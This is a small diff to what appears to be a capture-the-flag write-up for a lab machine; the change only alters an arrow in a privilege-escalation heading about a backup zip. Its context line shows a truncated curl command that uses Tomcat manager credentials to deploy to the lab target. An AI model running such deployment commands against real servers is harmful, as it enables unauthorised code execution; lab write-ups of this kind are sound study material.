@@ -33,7 +33,7 @@ curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/mnager/text/deploy?
 
 ## Privilege Escalation
 
-### Backup Zip --> Ash
+### Backup Zip -> Ash
 
 When looking aroun the file system, I found this backup file here:
 
